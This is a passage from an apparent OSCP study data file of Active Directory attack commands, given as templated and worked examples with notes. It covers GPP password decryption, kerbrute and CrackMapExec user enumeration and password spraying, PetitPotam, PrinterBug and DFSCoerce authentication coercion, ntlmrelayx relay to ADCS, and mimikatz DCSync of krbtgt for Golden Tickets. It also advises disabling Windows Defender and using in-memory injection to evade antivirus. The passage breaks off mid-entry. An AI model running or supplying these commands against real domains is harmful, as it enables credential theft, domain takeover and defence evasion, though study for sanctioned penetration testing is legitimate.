Look for Groups.xml in GPO SYSVOL paths - contains cpassword (encrypted passwords).

Use gpp-decrypt to decrypt.

Also check Scripts folder for logon/startup scripts that may contain credentials.

Manual path:
\\domain\SYSVOL\domain\Policies\{GUID}\","medium","","","","{""no results"": ""User may lack read access to GPO container"", ""cannot access files"": ""Navigate to gpcFileSysPath manually via UNC"", ""too many GPOs"": ""Focus on custom GPOs (non-default names)""}","{""-GPOname"": ""Filter to specific GPO by name"", ""-ComputerName"": ""GPOs applied to specific computer"", ""-Domain"": ""Query different domain""}","[""import-powerview""]","[""get-netgpo""]",""
"get-domainsid","Get Domain Security Identifier","enumeration","Get-DomainSID","Retrieve the Security Identifier (SID) for the current or specified domain. Domain SID is required for advanced attacks like Golden Ticket and Silver Ticket attacks. Essential component for Kerberos ticket forgery.","","","OSCP Critical for Golden Tickets:
Combine Domain SID + krbtgt hash + domain name to create Golden Ticket.

For user SID, append RID (500 for Administrator, 512 for Domain Admins group).

Manual alternative:
'whoami /user' shows current user's SID, remove last segment for domain SID.

Or 'wmic useraccount get name,sid'","medium","","","","{""no output"": ""Verify domain membership: systeminfo | findstr Domain"", ""access denied"": ""Should work for any domain user - check PowerView import"", ""wrong SID"": ""Ensure querying correct domain with -Domain flag""}","{""-Domain"": ""Get SID for different domain in forest""}","[""import-powerview""]","[""get-domainsid""]",""
"invoke-bloodhound","Run BloodHound Collector","enumeration","Invoke-BloodHound -CollectionMethod All","Execute BloodHound data collector (SharpHound) to gather comprehensive Active Directory relationship data. Collects user sessions, group memberships, ACLs, trusts, and other relationships for graph analysis. Outputs JSON files for import into BloodHound GUI.","","","OSCP Essential:
BloodHound visualizes attack paths you'd have to manually map otherwise.

Focus on 'Shortest Paths to Domain Admins' and 'Kerberoastable Accounts' queries.

Session collection is noisy (touches every computer).

Can run from Linux with bloodhound-python.

Transfer ZIP to attacker machine with BloodHound GUI for analysis.","high","","","","{""access denied"": ""User may lack permissions for session enumeration"", ""very slow"": ""Use -CollectionMethod Session or -Stealth for faster collection"", ""no output file"": ""Check current directory permissions and disk space"", ""incomplete data"": ""Some access denied errors are normal, check ZIP contents""}","{""-CollectionMethod All"": ""Collect all data types (default, recommended for OSCP)"", ""-CollectionMethod Session"": ""Only collect user sessions (faster, less noisy)"", ""-CollectionMethod LoggedOn"": ""Collect logged-on users via registry"", ""-Stealth"": ""Use stealth collection (avoid admin share enumeration)"", ""-Domain"": ""Target specific domain"", ""-OutputDirectory"": ""Specify output location for ZIP file""}","[""import-sharphound""]","",""
"kerbrute-userenum-ad","Kerbrute - Active Directory User Enumeration","enumeration","kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>","Enumerate valid AD usernames via Kerberos pre-authentication (AS-REQ) - extremely fast and stealthy","active-directory","kerbrute userenum -d corp.com --dc 192.168.50.70 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt","FASTEST and MOST STEALTHY user enumeration method for AD.

Uses Kerberos pre-authentication (AS-REQ) to validate usernames.

NOISE LEVEL:
Very Low - only generates event ID 4768 (Kerberos TGT request) for valid users, which is normal traffic.

Invalid usernames don't generate security logs.

SPEED:
Can test thousands of usernames per second.

WHY THIS WORKS:
When you request a TGT for a username, Kerberos responds differently for valid vs invalid users.

Valid users get 'PREAUTH_REQUIRED' error, invalid users get 'PRINCIPAL_UNKNOWN'.

This is by-design behavior, not a vulnerability.

TIME ESTIMATE:
10-60 seconds for 10k usernames.

RECOMMENDED WORDLISTS:
/usr/share/seclists/Usernames/Names/names.txt (common first names), /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt (comprehensive).

OSCP TIP:
Run this BEFORE password spraying to build valid username list.

No credentials needed! Save output with -o flag:
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o valid_users.txt","high","","","","{""Couldn't find any KDCs"": ""DC IP may be wrong or port 88 (Kerberos) is filtered. Verify: sudo nmap -p 88 -Pn -sU -v <DC_IP>"", ""context deadline exceeded"": ""Network timeout. Try --safe flag for slower requests or check connectivity to port 88/UDP"", ""Network error"": ""Kerberos port 88/UDP may be blocked. Verify firewall rules or try from different network position""}","{""userenum"": ""User enumeration mode"", ""-d"": ""Domain name (FQDN like corp.com)"", ""--dc"": ""Domain controller IP address"", ""-o"": ""Output file for valid usernames (recommended)"", ""-t"": ""Number of threads (default 10, increase for speed)"", ""--safe"": ""Low-and-slow mode (delays between requests)""}","","[""enum4linux-users-ad"", ""ldapsearch-users-ad""]","[""kerbrute-passwordspray"", ""impacket-getnpusers-asreproast"", ""spray-passwords-ldap"", ""crackmapexec-smb-spray""]"
"crackmapexec-rid-cycling","CrackMapExec - RID Cycling User Enumeration","enumeration","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --rid-brute","Enumerate domain users via RID cycling over SMB (requires NULL session or credentials)","active-directory","crackmapexec smb 192.168.50.70 -u guest -p '' --rid-brute","TRADITIONAL user enumeration via RID cycling.

RIDs (Relative Identifiers) are sequential numbers assigned to AD objects.

By querying RID 500, 501, 502...

you can enumerate users, groups, computers.

REQUIRES:
NULL session or valid credentials.

NOISE LEVEL:
High - SMB connections logged, many failed SID lookups generate events.

WHY THIS WORKS:
Windows exposes SID-to-name translation via MS-SAMR RPC over SMB.

RIDs follow pattern:
Domain SID + RID (e.g., S-1-5-21-[domain]-500 for Administrator).

SLOWER than Kerbrute but works when Kerberos port filtered.

TIME ESTIMATE:
1-3 minutes for default range.

MANUAL ALTERNATIVE:
rpcclient -U '' -N <TARGET> then lookupsids S-1-5-21-[domain]-[RID].

OSCP TIP:
Prefer kerbrute-userenum-ad when possible (faster, stealthier).

Use RID cycling when SMB is accessible but Kerberos is blocked, or when you want to enumerate groups/computers too (not just users).","medium","","","","{""STATUS_ACCESS_DENIED"": ""Null session or guest access blocked. Try with valid credentials: crackmapexec smb <TARGET> -u <VALID_USER> -p <VALID_PASS> --rid-brute"", ""STATUS_LOGON_FAILURE"": ""Invalid credentials. Try guest account: crackmapexec smb <TARGET> -u 'guest' -p '' --rid-brute"", ""Connection refused"": ""SMB port 445 blocked. Verify: sudo nmap -p 445 -Pn -v <TARGET>""}","{""--rid-brute"": ""Enable RID cycling to enumerate users"", ""-u"": ""Username (use '' or 'guest' for null session attempts)"", ""-p"": ""Password (use '' for blank password)"", ""-d"": ""Domain name (optional)"", ""--rid-brute-max"": ""Maximum RID to try (default 4000)""}","","[""kerbrute-userenum-ad"", ""enum4linux-users-ad"", ""ldapsearch-users-ad""]","[""crackmapexec-smb-spray"", ""kerbrute-passwordspray""]"
"ldapsearch-users-ad","ldapsearch - LDAP User Enumeration","enumeration","ldapsearch -x -H ldap://<TARGET> -b '<DOMAIN_DN>' '(&(objectClass=user)(objectCategory=person))' sAMAccountName userPrincipalName","Enumerate Active Directory users via LDAP queries (anonymous or authenticated)","active-directory","ldapsearch -x -H ldap://192.168.50.70 -b 'DC=corp,DC=com' '(&(objectClass=user)(objectCategory=person))' sAMAccountName userPrincipalName","COMPREHENSIVE user enumeration via LDAP.

Retrieves ALL user objects from Active Directory.

May work ANONYMOUSLY if anonymous LDAP binding enabled (rare in modern domains).

NOISE LEVEL:
Low - LDAP queries often not logged.

ADVANTAGES:
Gets full user list in single query, can retrieve additional attributes (description, memberOf, pwdLastSet).

WHY THIS WORKS:
AD exposes user objects via LDAP, readable by authenticated users (sometimes anonymous).

TIME ESTIMATE:
5-15 seconds.

OUTPUT PARSING:
Extract usernames with grep/awk:
ldapsearch ...

| grep 'sAMAccountName:' | awk '{print $2}' > users.txt.

USEFUL FILTERS:
Non-disabled users:
'(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'.

Users with no password expiry:
'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'.

OSCP TIP:
Try anonymous bind first.

If blocked, use any valid credentials.

Combine with kerbrute to validate enumerated users before spraying.","medium","","","","{""Can't contact LDAP server"": ""LDAP port 389 blocked. Verify: sudo nmap -p 389,636 -Pn -v <TARGET>. Try LDAPS: ldaps://<TARGET>"", ""Invalid credentials"": ""Anonymous bind disabled. Use credentials: ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b '<DOMAIN_DN>' ..."", ""Operations error"": ""Anonymous queries restricted. Retry with valid credentials."", ""Too many results"": ""Add grep filter: ... | grep 'sAMAccountName:' | awk '{print $2}' > users.txt""}","{""-x"": ""Use simple authentication (no SASL)"", ""-H"": ""LDAP URI (ldap:// for unencrypted, ldaps:// for SSL)"", ""-b"": ""Base DN for search (domain root)"", ""-D"": ""Bind DN for authenticated queries (optional): -D '<USER>@<DOMAIN>'"", ""-w"": ""Password for authenticated bind (optional, use with -D)"", ""'(&(objectClass=user)(objectCategory=person))'"": ""LDAP filter: match user objects only (excludes computers)"", ""sAMAccountName"": ""Attribute: Windows username (pre-Windows 2000)"", ""userPrincipalName"": ""Attribute: UPN format (user@domain.com)"", ""description"": ""Additional attribute to retrieve user descriptions"", ""memberOf"": ""Additional attribute to retrieve group memberships""}","","[""kerbrute-userenum-ad"", ""enum4linux-users-ad"", ""crackmapexec-rid-cycling""]","[""kerbrute-passwordspray"", ""spray-passwords-ldap""]"
"enum4linux-users-ad","Enum4linux - SMB User Enumeration","enumeration","enum4linux -U <TARGET>","Enumerate Active Directory users via SMB/RPC (supports null sessions and authenticated)","active-directory","enum4linux -U 192.168.50.70","CLASSIC user enumeration tool for Windows/AD environments.

Uses MS-SAMR RPC over SMB to enumerate users.

Often works via NULL SESSION on older systems.

NOISE LEVEL:
Medium - SMB connections logged.

LIMITATIONS:
Requires SMBv1 or null sessions (both often disabled on modern domains).

ADVANTAGES:
Gets users, groups, shares, and password policy in one command (-a flag).

WHY THIS WORKS:
Windows exposes user enumeration via SAMR RPC for backward compatibility.

TIME ESTIMATE:
15-45 seconds.

OUTPUT PARSING:
Extract usernames:
enum4linux -U <TARGET> | grep 'user:' | awk -F'[][]' '{print $2}'.

OSCP TIP:
Great for quick all-in-one enumeration (enum4linux -a) but less reliable on modern domains than kerbrute.

Use enum4linux first for broad recon, then kerbrute for targeted username validation.","medium","","","","{""NT_STATUS_ACCESS_DENIED"": ""Null session blocked. Try with credentials: enum4linux -u <USER> -p <PASS> -U <TARGET>"", ""Protocol negotiation failed"": ""SMBv1 disabled. Use crackmapexec-rid-cycling instead (supports SMBv2/v3)"", ""Cannot connect to server"": ""SMB ports filtered. Verify: sudo nmap -p 139,445 -Pn -v <TARGET>""}","{""-U"": ""Get userlist via SMB/RPC"", ""-u"": ""Specify username for authenticated enumeration (use with -p)"", ""-p"": ""Specify password for authenticated enumeration (use with -u)"", ""-a"": ""Do all simple enumeration (users, shares, groups, password policy)"", ""-v"": ""Verbose output""}","","[""kerbrute-userenum-ad"", ""crackmapexec-rid-cycling"", ""ldapsearch-users-ad""]","[""kerbrute-passwordspray"", ""crackmapexec-smb-spray""]"
"spray-passwords-ldap","Spray-Passwords.ps1 - LDAP Password Spraying","password-attacks","powershell -ep bypass -c ""C:\Tools\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin""","PowerShell script for low-and-slow Active Directory password spraying via LDAP/DirectoryEntry (policy-aware)","active-directory","powershell -ep bypass -c ""C:\Tools\Spray-Passwords.ps1 -Pass Nexus123! -Admin""","LOW-AND-SLOW password spraying method using PowerShell DirectoryEntry LDAP authentication.

AUTOMATICALLY reads domain password policy and respects lockout threshold.

NOISE LEVEL:
Very Low - only generates standard authentication events (Event ID 4776), appears as normal login attempts.

SPEED:
Slow (1-2 attempts per second) but STEALTHY.

WHY THIS WORKS:
DirectoryEntry constructor accepts three arguments (LDAP path, username, password).

If credentials are valid, object creation succeeds.

If invalid, exception is thrown.

Script enumerates all domain users via LDAP and attempts authentication for each user with the supplied password.

ADVANTAGES:
Policy-aware (won't lock out accounts), generates minimal network traffic, looks like normal user logins.

TIME ESTIMATE:
2-5 minutes for 100 users.

MANUAL ALTERNATIVE:
PowerShell one-liner:
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $PDC = ($domainObj.PdcRoleOwner).Name; $dn = 'DC=' + ($domainObj.Name -replace '\.',',DC='); $ldap = ""LDAP://$PDC/$dn""; New-Object System.DirectoryServices.DirectoryEntry($ldap, 'username', 'password').

If successful, returns distinguishedName and Path properties.

OSCP TIP:
Use this method when you have access to a domain-joined Windows system.

Run from PowerShell as logged-in domain user.

Script is at C:\Tools\Spray-Passwords.ps1 on many lab systems.

Source:
https://github.com/ZilentJack/Spray-Passwords","high","","","","{""Access denied"": ""Script requires domain user context. Run from domain-joined Windows system or use RDP/WinRM with valid credentials first."", ""Account locked out"": ""Exceeded lockout threshold. Check password policy with net-accounts-policy and wait for lockout observation window to expire."", ""Execution policy error"": ""Use -ep bypass flag: powershell -ep bypass -c \""C:\\Tools\\Spray-Passwords.ps1 -Pass <PASSWORD>\""""}","{""-Pass"": ""Single password to test against all domain users"", ""-File"": ""Password wordlist file (alternative to -Pass for multiple passwords)"", ""-Admin"": ""Include administrator accounts in spray (default is standard users only)"", ""-ep bypass"": ""PowerShell execution policy bypass""}","[""net-accounts-policy""]","[""crackmapexec-smb-spray"", ""kerbrute-passwordspray"", ""crackmapexec-winrm-spray""]","[""crackmapexec-validate-admin"", ""pth-evil-winrm"", ""ftp-connect""]"
"crackmapexec-smb-spray","CrackMapExec - SMB Password Spraying","password-attacks","crackmapexec smb <TARGET> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success","SMB-based password spraying with CrackMapExec (noisy but shows admin rights with Pwn3d! indicator)","active-directory","crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success","TRADITIONAL password spraying via SMB.

NOISY but provides BONUS FEATURE:
Pwn3d! indicator shows when credentials have LOCAL ADMIN rights on target system.

NOISE LEVEL:
High - each attempt creates full SMB connection, generates Event ID 4625 (failed logon) for wrong passwords, Event ID 4624 (successful logon) for valid credentials.

NETWORK TRAFFIC:
High - full SMB session setup/teardown for each attempt.

SPEED:
Slow (1 attempt per second).

WHY THIS WORKS:
CrackMapExec establishes SMB connection and attempts NTLM authentication.

Success/failure determined by STATUS code.

Local admin rights detected by attempting to list shares or access IPC$.

CRITICAL WARNING:
CrackMapExec does NOT respect password policy or check lockout threshold.

YOU must manually ensure you don't exceed lockout threshold (use 4 attempts max if threshold is 5, then wait for observation window).

TIME ESTIMATE:
1-3 minutes for 20 users.

RECOMMENDED USAGE:
Use after getting password policy (crackmapexec-policy) and calculating safe spray count.

Example calculation:
5 lockout threshold, 30min observation window = spray 4 passwords max, wait 30min, repeat.

OSCP TIP:
Despite being noisy, this is valuable for identifying admin rights immediately.

Use for final validation after finding credentials with quieter methods.

Create users.txt with one username per line first.","high","","","","{""STATUS_ACCOUNT_LOCKED_OUT"": ""Exceeded lockout threshold. Wait for lockout duration to expire (check policy with crackmapexec-policy). Reduce spray frequency."", ""STATUS_LOGON_FAILURE"": ""Invalid credentials (expected for wrong password). [+] indicates valid credentials."", ""Connection refused"": ""SMB port 445 blocked. Verify connectivity: sudo nmap -p 445 -Pn -v <TARGET>"", ""Too many failed attempts"": ""CAUTION: CrackMapExec does NOT check password policy. Manually calculate safe attempts: (lockout threshold - 1) attempts per (lockout observation window).""}","{""smb"": ""Use SMB protocol for authentication"", ""-u"": ""Username or file containing usernames (automatically detects file vs single username)"", ""-p"": ""Password (use quotes for special characters)"", ""-d"": ""Domain name for domain authentication"", ""--continue-on-success"": ""Don't stop at first valid credential, test all users"", ""--local-auth"": ""Authenticate to local SAM instead of domain (not for domain spraying)"", ""-t"": ""Number of threads (default 100, reduce if causing network issues)""}","[""crackmapexec-policy"", ""kerbrute-userenum-ad""]","[""spray-passwords-ldap"", ""kerbrute-passwordspray"", ""crackmapexec-winrm-spray""]","[""crackmapexec-validate-admin"", ""pth-evil-winrm""]"
"kerbrute-passwordspray","Kerbrute - Kerberos Password Spraying","password-attacks","kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> '<PASSWORD>'","Ultra-fast and stealthy password spraying via Kerberos pre-authentication (only 2 UDP packets per attempt)","active-directory","kerbrute passwordspray -d corp.com --dc 192.168.50.70 valid_users.txt 'Nexus123!'","FASTEST and STEALTHIEST password spraying method.

Uses Kerberos AS-REQ (TGT request) to test credentials.

ONLY 2 UDP PACKETS per attempt (AS-REQ and AS-REP).

NOISE LEVEL:
Minimal - only generates Event ID 4768 (TGT request) for valid credentials, Event ID 4771 (pre-auth failure) for wrong passwords.

These events are NORMAL domain traffic and rarely monitored.

SPEED:
Extremely fast - hundreds of attempts per second possible.

NETWORK TRAFFIC:
Minimal - 2 small UDP packets (typically <500 bytes total).

WHY THIS WORKS:
Kerberos pre-authentication requires encrypted timestamp using user's password hash.

If password is correct, KDC responds with TGT.

If wrong, KDC responds with PREAUTH_FAILED.

This is by-design Kerberos behavior.

ADVANTAGES:
No SMB connection needed, works remotely without network access to domain resources (only need UDP 88 to DC), no full authentication = stealthier.

TIME ESTIMATE:
10-30 seconds for 100 users.

CRITICAL:
Does NOT check password policy.

You must calculate safe attempts manually.

Example:
5 lockout threshold = spray 4 passwords max per user, wait 30min (observation window), repeat.

OSCP TIP:
Preferred method for password spraying when you can reach DC on UDP 88.

Use kerbrute userenum first to build valid username list, then spray.

Save results:
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> '<PASSWORD>' -o valid_creds.txt.

Can be run from Windows or Linux.","high","","","","{""Couldn't find any KDCs"": ""DC IP incorrect or Kerberos port 88 filtered. Verify: sudo nmap -p 88 -Pn -sU -v <DC_IP>"", ""context deadline exceeded"": ""Network timeout. Use --safe flag for slower requests or check connectivity"", ""No valid logins found"": ""Password incorrect for all users (expected). Try different password or verify usernames are valid.""}","{""passwordspray"": ""Password spraying mode"", ""-d"": ""Domain name (FQDN)"", ""--dc"": ""Domain controller IP address"", ""-o"": ""Output file for valid credentials"", ""-t"": ""Number of threads (default 10)"", ""--safe"": ""Low-and-slow mode with delays""}","[""kerbrute-userenum-ad"", ""net-accounts-policy""]","[""spray-passwords-ldap"", ""crackmapexec-smb-spray"", ""crackmapexec-winrm-spray""]","[""kerbrute-validate-creds"", ""crackmapexec-validate-admin"", ""pth-evil-winrm""]"
"crackmapexec-winrm-spray","CrackMapExec - WinRM Password Spraying","password-attacks","crackmapexec winrm <TARGET> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN>","WinRM-based password spraying to identify credentials with remote PowerShell access","active-directory","crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com","SPECIALIZED password spraying for WinRM access.

Tests if credentials have remote PowerShell access (user in Remote Management Users group or local admin).

NOISE LEVEL:
Medium-High - WinRM authentication attempts logged (Event ID 4625 for failures, 4624 for success).

PORT REQUIREMENTS:
TCP 5985 (HTTP) or 5986 (HTTPS).

WHY THIS WORKS:
CrackMapExec establishes WinRM connection and attempts authentication.

Pwn3d! indicator shows when user has remote management rights.

ADVANTAGES:
Directly identifies credentials that can be used with evil-winrm or Enter-PSSession for remote PowerShell access.

SPEED:
Medium (2-3 seconds per attempt).

TIME ESTIMATE:
2-4 minutes for 20 users.

USE CASE:
When you specifically want remote PowerShell access rather than SMB.

WinRM is increasingly common on modern Windows environments (default enabled on servers).

OSCP TIP:
WinRM is often enabled on Windows Server targets.

If you find valid credentials via this method, immediately try evil-winrm for interactive PowerShell shell:
evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'.

Does NOT check password policy - calculate safe attempts manually.","high","","","","{""Connection refused"": ""WinRM not enabled or port 5985/5986 blocked. Verify: sudo nmap -p 5985,5986 -Pn -v <TARGET>"", ""Authentication failed"": ""Expected for wrong password. [+] indicates valid credentials."", ""Pwn3d! not showing"": ""Valid credentials found but user not in Remote Management Users group. Credentials still valid for other services.""}","{""winrm"": ""Use WinRM protocol (HTTP/HTTPS remote management)"", ""-u"": ""Username or file containing usernames"", ""-p"": ""Password to test"", ""-d"": ""Domain name"", ""--continue-on-success"": ""Test all users, don't stop at first valid credential""}","[""crackmapexec-policy"", ""kerbrute-userenum-ad""]","[""crackmapexec-smb-spray"", ""spray-passwords-ldap"", ""kerbrute-passwordspray""]","[""pth-evil-winrm"", ""enter-pssession""]"
"petitpotam-coerce","PetitPotam - Coerce NTLM Authentication","exploitation","python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>","Force target machine to authenticate to attacker using EfsRpcOpenFileRaw","active-directory","python3 PetitPotam.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 192.168.50.100 192.168.50.70","PETITPOTAM ATTACK:
Exploits EfsRpcOpenFileRaw to force target to authenticate to attacker.

USE CASES:
1. ADCS Relay (ESC8): Coerce DC to attacker  relay to CA  get DC cert
2. Unconstrained Delegation: Coerce to host with unconstrained delegation to capture TGT
3. LDAP Relay: Relay to DC for RBCD or shadow credentials

SETUP FOR ADCS RELAY:
# Terminal 1: Start relay
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Trigger coercion
python3 PetitPotam.py <attacker_ip> <dc_ip>

NULL SESSION:
Try without credentials first - many DCs allow unauthenticated coercion.

OSCP TIP:
PetitPotam + ADCS relay is a high-impact attack chain for domain compromise.","high","","","","{""STATUS_ACCESS_DENIED"": ""Try with credentials or different target"", ""Connection refused"": ""Target port 445 not accessible""}","{""-u"": ""Username for authentication (optional - try null session first)"", ""-p"": ""Password for authentication"", ""-d"": ""Domain name"", ""-pipe"": ""Named pipe to use (default: lsarpc)""}","","[""coercer-coerce"", ""printerbug-trigger""]","[""ntlmrelayx-adcs"", ""ntlmrelayx-ldap""]"
"coercer-coerce","Coercer - Multi-Protocol Authentication Coercion","exploitation","coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -l <LISTENER_IP> -t <TARGET_IP>","Test multiple coercion methods (MS-RPRN, MS-EFSR, MS-FSRVP, etc.)","active-directory","coercer coerce -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70","COERCER ADVANTAGE:
Tests ALL known coercion methods automatically:
- MS-EFSR (PetitPotam)
- MS-RPRN (PrinterBug/SpoolSample)
- MS-FSRVP (ShadowCoerce)
- MS-DFSNM (DFSCoerce)

This is better than running individual tools.

USE CASE:
When PetitPotam is patched, Coercer will find alternative working methods.","high","","","","{""All methods failed"": ""Target may be patched or methods blocked""}","{""coerce"": ""Perform coercion attacks"", ""-u"": ""Username for authentication"", ""-p"": ""Password"", ""-d"": ""Domain name"", ""-l"": ""Listener IP (where auth will be sent)"", ""-t"": ""Target IP to coerce"", ""--filter-method"": ""Test only specific methods"", ""--filter-protocol"": ""Test only specific protocols (MS-RPRN, MS-EFSR, etc.)""}","","[""petitpotam-coerce"", ""printerbug-trigger""]","[""ntlmrelayx-adcs""]"
"printerbug-trigger","PrinterBug/SpoolSample - Trigger Print Spooler Coercion","exploitation","python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' <LISTENER_IP>","Force target to authenticate using MS-RPRN (Print Spooler)","active-directory","python3 printerbug.py 'corp.local/user:P@ssw0rd123!@192.168.50.70' 192.168.50.100","PRINTERBUG (MS-RPRN):
Abuses RpcRemoteFindFirstPrinterChangeNotificationEx to force authentication.

REQUIRES:
- Print Spooler service running on target (default on most Windows)
- Valid domain credentials

OLDER BUT RELIABLE:
PetitPotam may be patched, but PrinterBug often still works.","high","","","","{""Print Spooler not running"": ""Service disabled on target - try different method""}","","","[""petitpotam-coerce"", ""coercer-coerce""]","[""ntlmrelayx-adcs""]"
"dfscoerce-trigger","DFSCoerce - Trigger DFS Coercion","exploitation","python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>","Force target to authenticate using MS-DFSNM (DFS)","active-directory","python3 dfscoerce.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' 192.168.50.100 192.168.50.70","DFSCOERCE:
Alternative coercion method using Distributed File System.

USE WHEN:
- PetitPotam patched
- Print Spooler disabled
- Target has DFS role installed","medium","","","","{""DFS not available"": ""Target does not have DFS role""}","{""-u"": ""Username"", ""-p"": ""Password"", ""-d"": ""Domain""}","","[""petitpotam-coerce"", ""coercer-coerce""]","[""ntlmrelayx-adcs""]"
"ntlmrelayx-adcs","ntlmrelayx - Relay to ADCS for Certificate","exploitation","ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>","Relay coerced NTLM authentication to CA for certificate issuance","active-directory","ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController","ADCS RELAY (ESC8):
Relay machine account authentication to CA to get certificate.

ATTACK FLOW:
1. Start ntlmrelayx targeting CA web enrollment
2. Trigger coercion with PetitPotam/Coercer/PrinterBug
3. Relay captures DC$ auth  requests cert as DC$
4. Use cert with certipy auth to get DC hash

REQUIRES:
- CA web enrollment enabled (HTTP)
- NTLM authentication allowed on CA
- Template that allows machine enrollment (e.g., DomainController)

DC COMPROMISE:
With DC cert, you can DCSync entire domain.","high","","","","{""Template not found"": ""Verify template name from CA configuration"", ""NTLM not allowed"": ""CA configured for Kerberos only""}","{""-t"": ""Target URL for relay (CA web enrollment)"", ""-smb2support"": ""Enable SMB2 support for incoming connections"", ""--adcs"": ""Enable ADCS relay mode"", ""--template"": ""Certificate template to request""}","[""petitpotam-coerce""]","","[""certipy-auth""]"
"ad-dcsync-mimikatz-user","DCSync Specific User with Mimikatz","post-exploit","mimikatz # lsadump::dcsync /user:<DOMAIN>\<USERNAME>","Extract password hash of a specific domain user by impersonating a domain controller. Uses Directory Replication Service (DRS) protocol to request credentials remotely. PRIMARY method for obtaining krbtgt hash for Golden Ticket attacks.","active-directory","mimikatz # lsadump::dcsync /user:corp\dave","DCSync is PREFERRED over LSA dumping because it's remote (no code execution on DC needed) and uses legitimate AD replication protocols. CRITICAL for OSCP: Always DCSync krbtgt FIRST to enable Golden Ticket attacks. The krbtgt hash rarely changes (only during domain functional level upgrades), providing persistent domain access. Example output parsing: Look for 'Hash NTLM:' line, copy the 32-character hex hash. Save to file for Hashcat cracking: echo [hash] > hashes.txt. Time estimate: 10-30 seconds for single user extraction.

MANUAL ALTERNATIVES:
Specify domain controller explicitly:
mimikatz # lsadump::dcsync /user:corp\krbtgt /domain:corp.com /dc:DC1.corp.com

Dump with password history:
mimikatz # lsadump::dcsync /user:corp\Administrator /history

PowerShell alternative (requires Invoke-Mimikatz):
Invoke-Mimikatz -Command '""lsadump::dcsync /user:corp\krbtgt""'

Impacket (Linux - RECOMMENDED for OSCP):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:""BrouhahaTungPerorateBroom2023!""@192.168.50.70'

Hash extraction:
mimikatz # lsadump::dcsync /user:corp\dave | findstr ""NTLM""

TIME ESTIMATE: 10-30 seconds (single user extraction)","high","","","","{""ERROR 0x00002105 (Access Denied)"": ""Current user lacks replication privileges. Solution: Verify Domain Admin membership: net group \""Domain Admins\"" /domain. Check current user: whoami /groups | findstr \""Domain Admins\"". If not DA, verify explicit replication rights: Get-Acl 'AD:\\DC=corp,DC=com' (requires PowerShell RSAT). DCSync requires BOTH DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All."", ""RPC server unavailable"": ""Cannot contact Domain Controller. Solution: Verify DC connectivity: nltest /dsgetdc:<DOMAIN>. Test RPC: portqry -n <DC_IP> -p tcp -e 135,445. Check firewall rules: Test-NetConnection <DC_FQDN> -Port 135. Verify DNS resolution: nslookup <DC_FQDN>. If DC is down, target alternative DC with /dc: flag."", ""User name or password is incorrect"": ""Session not authenticated to domain OR wrong domain. Solution: Verify domain authentication: echo %USERDOMAIN% (should show domain, not computer name). Re-authenticate: runas /netonly /user:<DOMAIN>\\<DA_USER> cmd.exe, then launch Mimikatz. If using Pass-the-Hash session, verify token with: whoami /groups."", ""Object not found"": ""Username doesn't exist or typo. Solution: Verify account exists: net user <USERNAME> /domain. Check for typos in domain name: net group \""Domain Users\"" /domain. Query all users: net user /domain. Common mistake: Using display name instead of SAM account name (use samaccountname, not cn)."", ""Mimikatz is not recognized"": ""Mimikatz not in PATH or current directory. Solution: Navigate to Mimikatz directory: cd C:\\Tools. Or use full path: C:\\Tools\\mimikatz.exe. Verify file exists: dir mimikatz.exe. If blocked by AV, disable Windows Defender: Set-MpPreference -DisableRealtimeMonitoring $true (requires admin)."", ""Antivirus blocks Mimikatz"": ""AV/EDR detecting Mimikatz signature. Solution: Use obfuscation: Invoke-ReflectivePEInjection, or use alternative tool: Impacket secretsdump (Linux-based, no AV on attacker machine). Consider Cobalt Strike's execute-assembly for in-memory execution. OSCP TIP: Disable AV if you have admin rights: Set-MpPreference -DisableRealtimeMonitoring $true""}","{""lsadump::dcsync"": ""Mimikatz module that performs DC synchronization attack. Simulates the behavior of a domain controller requesting password data via Directory Replication Service Remote Protocol (MS-DRSR). This is NOT memory dumping - it's a network-based attack using legitimate AD replication APIs. CRITICAL: Requires Domain Admin or replication rights (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)."", ""/user:<DOMAIN>\\<USERNAME>"": ""Specifies the target account to replicate. Format must include domain prefix (DOMAIN\\user or DOMAIN.COM\\user). The backslash must be escaped in some contexts (double backslash in scripts). Common targets: krbtgt (RID 502), Administrator (RID 500), service accounts (SPN-based accounts like sqlsvc, backup-svc). WHY specific user: Reduces noise and log volume compared to dumping all hashes."", ""Optional: /domain:<DOMAIN_FQDN>"": ""Explicitly specify target domain FQDN. Usually auto-detected from /user parameter, but 